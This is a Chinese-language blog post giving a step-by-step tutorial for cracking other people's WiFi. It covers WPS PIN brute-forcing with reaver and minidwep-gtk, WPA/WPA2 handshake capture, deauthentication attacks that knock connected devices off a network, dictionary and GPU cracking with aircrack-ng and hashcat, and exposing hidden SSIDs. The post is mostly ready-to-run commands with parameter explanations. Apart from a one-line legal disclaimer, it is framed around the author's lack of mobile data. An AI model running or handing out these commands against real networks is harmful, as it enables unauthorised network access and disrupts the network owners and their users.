---
title: wifi安全渗透
date: 2022-08-28 8:38:01.0
updated: 2022-08-28 8:38:01.0
categories: 
- 网络安全
tags: 
---

## 序章

最近流量没了，穷的吃土，研究了一下WIFI无线安全写出相关文章希望大家能对认识网络安全提供帮助

**（文章仅用于学习交流，请勿违法！)**

![image-20230110132649651](https://wrxinyue.oss-cn-hongkong.aliyuncs.com/img/image-20230110132649651.png)

## 破解方式

wifi的破解方式很多，在上面的文章说了如果无线路由器开启了WPS就可以使用pin码进行破解，除了pin码破解还有社会工程学抓包跑字典等方式



### pin码破解

难度：⭐⭐

时长：0~2小时，平均一小时

条件：路由器WPS功能是否开启，路由器信号强度，路由器是否防PIN

原理：WPS的pin码并没有加密。Reaver会暴力破解pin码，找到pin码也就找到了密码。

环境要求：

1. 网卡支持数据包注入
2. 要求无线信号强

注意事项：

1. 如果发送pin码过快，有可能造成路由器崩溃；就类似对服务器的DDOS攻击。
2. 此过程不能联网，虚拟器需要断开网络连接
2. Reaver有很多其他选项，查看帮助：reaver ?

**查看网卡**

~~~shell
airmon-ng
~~~

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://ywnz.com/uploads/allimg/17/1-1G016111554502.JPG)

上面命令列出了支持监控模式的无线网卡。一般是带wlan开头的，自带的网卡如eth0是不支持的，市面上90%笔记本网卡是不支持渗透测试的。

**开启监听模式**

~~~shell
airmon-ng start wlan0
~~~

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://ywnz.com/uploads/allimg/17/1-1G0161116064B.JPG)

执行成功之后网卡接口变为wlan0mon；可以使用ifconfig命令查看。

**查询开启WPS功能的无线路由器**

~~~shell
wash -i wlan0mon -C
~~~

如果什么也没有表示周围没有开启WPS的无线路由器。记住要破解wifi的BSSID。

 

**开始破解密码**

~~~shell
reaver -i wlan0mon -b C8:3A:35:30:3E:C8 -vv -a
~~~

最后，不要忘了结束无线网卡的监控模式：

~~~shell
airmon-ng stop wlan0mon
~~~

### CD Linux配合minidwep-gtk工具跑PIN破解WiFi

和上一个pin码原理一样，只是这个CD Linux集成的工具跑起来更简单方便

难度：⭐

**1.挂载网卡**
首先打开CD Linux并且将网卡挂载到CD Linux
具体的操作步骤是：
VM ware虚拟机-可移动设备-Realtek RTL8187 Wireless-连接（与主机断开连接）
会弹出提示,探后点确定

**2.使用水滴**
**2.1打开水滴**
CD Linux给我们提供了许多好用的软件，本次只使用水滴用作演示，感兴趣的可以自行了解。
双击打开水滴（minidwep-gtk）

请仔细阅读弹出对话框中的内容，然后点OK

**2.2扫描**
点完OK就进入到主界面，然后点击扫描

程序会自动扫描附近的wifi，等个几十秒，所有扫描结果就展示出来了。

**2.3扫描结果**

这里面的wifi信号强度绝对值小的信号强，比如-50比-60信号强
往下找，发现有带WPS的wifi

**2.4跑PIN**
选中一个带有WPS的wifi，点击Reaver，如果你不知道各个参数代表啥，直接在弹出的对话框中点击OK。

这里有一篇关于Reaver参数设置的文章

reaver使用相关

在此期间程序会一个一个地尝试每一个PIN码，这个过程叫做“跑PIN”


理想速率是5 seconds/pin

**2.5结果**
功夫不负有心人，在尝试到15389664时，成功了！
获取到了wifi的PIN码以及密码

### 使用Aircrack破解wifi密码(wpa/wpa2)

难度：⭐⭐⭐

这个方法同样不能联网，这种方式的原理是通过抓包，然后跑字典达到破解密码的目的，步骤相对繁琐，我有更方便的方式用airgeddon工具进行破解，有兴趣的小伙伴可以看一看，好了让我们继续

**查看网卡**

~~~shell
airmon-ng
~~~

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://wrxinyue.oss-cn-hongkong.aliyuncs.com/img/1-1G016111554502.JPG)

上面命令列出了支持监控模式的无线网卡。一般是带wlan开头的，自带的网卡如eth0是不支持的，市面上90%笔记本网卡是不支持渗透测试的。

**开启监听模式**

~~~shell
airmon-ng start wlan0
~~~

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://wrxinyue.oss-cn-hongkong.aliyuncs.com/img/1-1G0161116064B.JPG)

执行成功之后网卡接口变为wlan0mon；可以使用ifconfig命令查看。

**查看wifi网络**

~~~shell
airodump-ng wlan0mon
~~~

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://wrxinyue.oss-cn-hongkong.aliyuncs.com/img/1-1G01611161S27.JPG)

上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等。要记住要破解wifi的频道号和BSSID。

按Ctrl-C结束。

**抓取握手包**

使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包－也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包。

开始抓包：

~~~shell
airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 -w ~/ wlan0mon
~~~

参数解释：

-c指定频道号

-bssid指定路由器bssid

-w指定抓取的数据包保存位置

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://wrxinyue.oss-cn-hongkong.aliyuncs.com/img/1-1G016111630U9.JPG)

 

**强制连接到wifi的设备重新连接路由器**

现在我们只要等用户连接/重连接wifi了，运气不好也许要很长时间。

但是我们是不会等的，这不是耐心黑客该干的事。有一个叫aireplay-ng的工具，它可以强制用户断开wifi连接；原理是，给连接到wifi的一个设备发送一个deauth（反认证）包，让那个设备断开wifi，随后它自然会再次连接wifi。

aireplay-ng的生效前提是，wifi网络中至少有一个连接的设备。从上图可以看到哪些设备连接到了wifi，STATION就是连接设备的MAC地址，记住一个。

[aircrack-ng官网](https://www.aircrack-ng.org/)

打开新终端执行：

~~~shell
aireplay-ng -0 2 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
~~~

参数解释：

-0表示发起deauthentication攻击

-a指定无线路由器BSSID

-c指定强制断开的设备

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://ywnz.com/uploads/allimg/17/1-1G0161116423V.JPG)

如果成功：

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://ywnz.com/uploads/allimg/17/1-1G016111A4343.JPG)

按Ctrl-C结束抓包。

我们已经得到了想要的握手包了，可以结束无线网卡的监控模式了：

~~~shell
airmon-ng stop wlan0mon
~~~

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://ywnz.com/uploads/allimg/17/1-1G016111F5355.JPG)

**开始破解密码**

~~~shell
aircrack-ng -a2 -b C8:3A:35:30:3E:C8 -w /usr/share/wordlists/rockyou.txt ~/*.cap
~~~

参数解释：

-a2代表WPA的握手包

-b指定要破解的wifi BSSID。

-w指定字典文件

最后是抓取的包

![Kali Linux使用Aircrack破解wifi密码(wpa/wpa2)](https://ywnz.com/uploads/allimg/17/1-1G016111Ga23.JPG)

可选）使用显卡的运算能力

如果你有一个强大的GPU，为什么不使用GPU跑字典呢？

Hashcat可以借助GPU的运算力破解各种不同算法的hash值。

下载时要注意选择正确的显卡类型（AMD、NVidia）。Kali Linux自带这个工具。

在破解cap文件之前，要把它转换为hccap文件：

\# aircrack-ng file.cap -J out.hccap

使用GPU破解hash：

\# hashcat -m 2500 out.hccap 字典文件

### 破解隐藏网络(隐藏SSID)

难度：⭐

![使用Reaver破解开启了WPS功能的wifi密码(wpa/wpa2)](https://ywnz.com/uploads/allimg/17/1-1G016112542O7.JPG)

**查看方法：**

~~~shell
airodump-ng -c 6 --bssid C8:3A:35:30:3E:C8 wlan0mon
aireplay-ng -0 30 -a C8:3A:35:30:3E:C8 -c B8:E8:56:09:CC:9C wlan0mon
~~~

 


## 参考

[无线网络的加密方式：WEP、WPA和WPA2](xie1997.blog.csdn.net/article/details/83316451)

[使用Reaver破解开启了WPS功能的wifi密码(wpa/wpa2)](https://ywnz.com/linuxaq/113.html)

[无线安全专题_破解篇02--kali破解pin](https://cloud.tencent.com/developer/article/1152164)

[无线局域网安全（一）———WEP加密](https://blog.csdn.net/lee244868149/article/details/52691266)

[从黑客角度来谈如何保护路由器-WPS破解方式（一）](https://zhuanlan.zhihu.com/p/41463410)

[网络安全--跑PIN破解WiFi(详细教程)](https://blog.csdn.net/a1397852386/article/details/125572633)

[WPA3---SAE原理介绍](https://blog.csdn.net/weixin_43408952/article/details/83044719)

[什么是WPA3](https://info.support.huawei.com/info-finder/encyclopedia/zh/WPA3.html)
